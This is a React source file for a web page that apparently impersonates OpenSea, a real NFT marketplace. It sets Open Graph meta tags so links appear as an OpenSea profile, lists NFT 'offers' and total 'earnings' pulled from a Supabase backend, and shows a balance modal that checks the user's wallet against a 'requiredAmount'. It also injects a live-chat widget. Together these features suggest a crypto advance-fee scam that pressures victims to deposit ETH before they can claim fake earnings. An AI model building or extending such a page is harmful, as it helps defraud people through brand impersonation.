import { useState, useEffect } from "react";
import axios from "axios";
import Accordion from "./new_components/Accordion";
import Header from "./new_components/Header";
import OffersList from "./new_components/OffersList";
import NFTCard from "./new_components/NFTCard";
import Footer from "./components/Footer";
import BalanceModal from "./new_components/BalanceModal";
import TransactionProcess from "./new_components/TransactionProcess";
import { ToastContainer } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
// import AnnoucementBanner from "./new_components/AnnoucementBanner";
import {
  fetchAllNFT,
  fetchAmount,
  fetchWalletAddress,
} from "./database/supabase";

export default function App() {
  const [ethPriceUSD, setEthPriceUSD] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [walletBalance, setWalletBalance] = useState("0.0000");
  const [walletAddress, setWalletAddress] = useState("Loading...");
  const [isTransModalOpen, setisTransModalOpen] = useState(false);
  // const [isBannerVisible, setIsBannerVisible] = useState(true);
  const [nftData, setNftData] = useState([]);
  const [requiredAmount, setRequiredAmount] = useState(null);

  useEffect(() => {
    const fetchDataAndSetup = async () => {
      try {
        const nfts = await fetchAllNFT();
        setNftData(nfts); // Store the fetched NFT data in state

        const cachedPrice = localStorage.getItem("ethPriceUSD");
        const cachedTime = localStorage.getItem("ethPriceTime");
        const currentTime = new Date().getTime();

        if (
          cachedPrice &&
          cachedTime &&
          currentTime - cachedTime < 10 * 60 * 1000
        ) {
          setEthPriceUSD(cachedPrice);
        } else {
          const response = await axios.get(
            "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd"
          );
          const price = response.data.ethereum.usd;
          setEthPriceUSD(price);
          localStorage.setItem("ethPriceUSD", price);
          localStorage.setItem("ethPriceTime", currentTime);
        }

        // Fetch wallet address for dynamic meta tags
        const walletAddress = await fetchWalletAddress();

        // Fetch requiredAmount from Supabase
        const amount = await fetchAmount();
        setRequiredAmount(amount);

        // Dynamically add the Tidio script
        const script = document.createElement("script");
        script.src = "//code.tidio.co/60ppful0d4gql7c3ox6moaaf4qvqwp7g.js";
        script.async = true;
        document.body.appendChild(script);

        // Helper function to set or update meta tag
        const setMetaTag = (property, content) => {
          let metaTag = document.querySelector(`meta[property='${property}']`);
          if (!metaTag) {
            metaTag = document.createElement("meta");
            metaTag.setAttribute("property", property);
            document.head.appendChild(metaTag);
          }
          metaTag.setAttribute("content", content);
        };

        // Set or update all the required meta tags
        setMetaTag(
          "og:image",
          `https://open-graph.opensea.io/v1/accounts/${walletAddress}`
        );
        setMetaTag("og:url", `https://opensea.io/${walletAddress}`);
        setMetaTag("og:title", `${walletAddress} - Profile | OpenSea`);
        setMetaTag(
          "og:description",
          `Check out ${walletAddress}'s NFTs on OpenSea, the largest marketplace for crypto collectibles.`
        );

        // Cleanup on component unmount
        return () => {
          document.body.removeChild(script);
          document.head
            .querySelectorAll(`meta[property^='og:']`)
            .forEach((meta) => meta.remove());
        };
      } catch (error) {
        console.error("Error fetching data or setting up the page:", error);
      }
    };

    fetchDataAndSetup();
  }, []);

  // Calculate total earnings in ETH
  const totalEarnings = nftData.reduce(
    (total, nft) => total + parseFloat(nft.price),
    0
  );

  const handleOpenModal = (balance, address) => {
    setWalletBalance(balance);
    setWalletAddress(address);
    setIsModalOpen(true);
  };

  const handleOpenTransactionModal = () => {
    setisTransModalOpen(true);
  };

  const handleCloseTransactionModal = () => {
    setisTransModalOpen(false);
  };

  return (
    <section>
      <Header />
      <div className="relative py-12 overflow-hidden bg-neutral-950 bg-[radial-gradient(ellipse_80%_80%_at_50%_-20%,rgba(120,119,198,0.3),rgba(255,255,255,0))] sm:py-16 lg:py-14 xl:py-16">
        <div className="px-4 mx-auto sm:px-6 lg:px-2 max-w-screen-2xl lg:mb-44">
          <div className="flex flex-col lg:flex-row lg:justify-between">
            {/* Pass nftData and ethPriceUSD to NFTCard */}
            <NFTCard cards={nftData} ethPriceUSD={ethPriceUSD} />
            <div className="max-w-md mx-auto text-center xl:max-w-lg lg:mx-0 lg:text-left order-2 lg:order-2">
              {/* Pass nftData as offers and other props to OffersList */}
              <OffersList
                offers={nftData}
                ethPriceUSD={ethPriceUSD}
                totalEarnings={totalEarnings}
                onOpenModal={handleOpenModal}
                onTransactionModalShow={handleOpenTransactionModal}
                onTransactionModalHide={handleCloseTransactionModal}
              />
            </div>
          </div>
        </div>
        <Accordion />
        <Footer />
      </div>
      <BalanceModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        balance={walletBalance}
        requiredAmount={requiredAmount}
        walletAddress={walletAddress}
      />
      <TransactionProcess
        isOpen={isTransModalOpen}
        onClose={() => setisTransModalOpen(false)}
      />
      <ToastContainer position="top-right" autoClose={5000} />
    </section>
  );
}
